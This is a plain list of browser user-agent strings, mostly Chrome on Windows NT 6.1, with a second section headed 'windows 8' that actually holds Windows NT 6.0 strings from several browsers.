		Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36 
		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36 
		Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17 
		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1284.0 Safari/537.13 
		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2 
		Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3 
		Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3 
		Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3 
		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3 
		Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11 
		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11 
		Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11 
		Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.8 (KHTML, like Gecko) Chrome/17.0.940.0 Safari/535.8 
		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.77 Safari/535.7ad-imcjapan-syosyaman-xkgi3lqg03!wgz 
		Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.7xs5D9rRDFpg2g 
		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.8 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.8 
		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/535.2 
		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.815.10913 Safari/535.1 
		Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.814.0 Safari/535.1 
		Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.813.0 Safari/535.1 
		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.812.0 Safari/535.1 
		Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.811.0 Safari/535.1 
		Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.810.0 Safari/535.1 
		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.801.0 Safari/535.1 
		Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/526.3 (KHTML, like Gecko) Chrome/14.0.564.21 Safari/526.3 
		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.215 Safari/535.1 
		Mozilla/5.0 (Windows NT 6.1; en-US) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.750.0 Safari/534.30 
		Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.53 Safari/534.30 
		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.113 Safari/534.30 
		Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/12.0.702.0 Safari/534.24 
		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/12.0.702.0 Safari/534.24 
		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.699.0 Safari/534.24 
		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.697.0 Safari/534.24 
		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.68 Safari/534.24 
		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24 
		Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.12 Safari/534.24 
		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.694.0 Safari/534.24 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.669.0 Safari/534.20 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/11.0.655.0 Safari/534.17 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/11.0.654.0 Safari/534.17 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/10.0.649.0 Safari/534.17 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/10.0.649.0 Safari/534.17 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.134 Safari/534.16 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU; AppleWebKit/534.16; KHTML; like Gecko; Chrome/10.0.648.11;Safari/534.16) 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.638.0 Safari/534.16 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.19 Safari/534.13 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.0 Safari/534.13 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.596.0 Safari/534.13 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.224 Safari/534.10 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.498.0 Safari/534.6 
		Mozilla/5.0 (ipad Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.498.0 Safari/534.6 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.461.0 Safari/534.3 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.460.0 Safari/534.3 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.459.0 Safari/534.3 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.458.1 Safari/534.3 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.2 (KHTML, like Gecko) Chrome/6.0.454.0 Safari/534.2 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.428.0 Safari/534.1 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.428.0 Safari/534.1 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.9 (KHTML, like Gecko) Chrome/6.0.400.0 Safari/533.9 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/6.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.999 Safari/533.4 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.370.0 Safari/533.4 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.354.0 Safari/533.3 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.3 Safari/533.2 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.307.1 Safari/532.9 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.1.249.1025 Safari/532.5 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; it-IT) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.25 Safari/532.5 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.246.0 Safari/532.5 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.3 (KHTML, like Gecko) Chrome/4.0.227.0 Safari/532.3 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.3 (KHTML, like Gecko) Chrome/4.0.223.5 Safari/532.3 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.223.1 Safari/532.2 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.3 Safari/532.2 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.12 Safari/532.2 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.213.1 Safari/532.1 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.212.0 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.4 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.0 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.208.0 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.1 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.0 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.11 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.0 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196.2 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.4 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.3 Safari/532.0 
		Mozilla/6.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.27 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.27 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.21 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.10 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.1 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/531.4 (KHTML, like Gecko) Chrome/3.0.194.0 Safari/531.4 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/531.3 (KHTML, like Gecko) Chrome/3.0.193.2 Safari/531.3 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/531.0 (KHTML, like Gecko) Chrome/3.0.191.0 Safari/531.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/531.0 (KHTML, like Gecko) Chrome/2.0.182.0 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/531.0 (KHTML, like Gecko) Chrome/2.0.182.0 Safari/531.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.0 (KHTML, like Gecko) Chrome/2.0.182.0 Safari/531.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.6 (KHTML, like Gecko) Chrome/2.0.174.0 Safari/530.6 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.43 Safari/530.5 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.4 (KHTML, like Gecko) Chrome/2.0.172.0 Safari/530.4 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/528.8 (KHTML, like Gecko) Chrome/2.0.156.1 Safari/528.8 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/528.8 (KHTML, like Gecko) Chrome/1.0.156.0 Safari/528.8 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.43 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.3.154.9 Safari/525.19

		windows 8: 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14 
		Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2 
		Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729) 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527 (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: ) 
		Mozilla/5.0 (Windows NT 6.0; rv:14.0) Gecko/20100101 Firefox/14.0.1 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1 
		Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) 
		Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0) 
		Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0) 
		Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/5.0) 
		Opera/9.25 (Windows NT 6.0; U; en) 
		Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506) 
		Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; InfoPath.1) 
		Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0) 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.38 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.224 Safari/534.10 ChromePlus/1.5.2.0 
		Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30618; Lunascape 4.7.3) 
		Mozilla/5.0 (Windows NT 6.0; rv:2.1.1) Gecko/20110415 Firefox/4.0.2pre Fennec/4.0.1 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2a1pre) Gecko/20081222 Fennec/1.0a2 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1 
		Opera/9.80 (Windows NT 6.0; Opera Mobi/49; U; en) Presto/2.4.18 Version/10.00 
		Mozilla/5.0 (Windows NT 6.0) yi; AppleWebKit/345667.12221 (KHTML, like Gecko) Chrome/23.0.1271.26 Safari/453667.1221 
		Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5 
		Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19 
		Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11 
		Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11 
		Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11 
		Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7 
		Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7 
		Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7 
		Chrome/15.0.860.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/15.0.860.0 
		Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.792.0 Safari/535.1 
		Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1 
		Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1 
		Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.220 Safari/535.1 
		Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.220 Safari/535.1 
		Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.107 Safari/535.1 
		Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.1 Safari/535.1 
		Mozilla/5.0 (Windows NT 6.0) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30 
		Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.699.0 Safari/534.24 
		Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.34 Safari/534.24 
		Mozilla/5.0 (Windows NT 6.0) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.0 Safari/534.13 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/8.0.552.224 Safari/533.3 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.8 (KHTML, like Gecko) Chrome/7.0.521.0 Safari/534.8 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.458.1 Safari/534.3 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.127 Safari/533.4 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.5 Safari/533.2 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.1 Safari/533.2 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.241.0 Safari/532.4 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.3 (KHTML, like Gecko) Chrome/4.0.224.2 Safari/532.3 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.223.0 Safari/532.2 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.12 Safari/532.2 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.6 Safari/532.2 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.220.1 Safari/532.1 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.213.1 Safari/532.1 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.7 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.4 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.2 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.208.0 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.1 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.0 (x86_64); de-DE) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.2 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198.0 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.11 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196.2 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.3 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.27 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.21 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.20 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.17 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.10 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.1 Safari/532.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/531.3 (KHTML, like Gecko) Chrome/3.0.193.2 Safari/531.3 
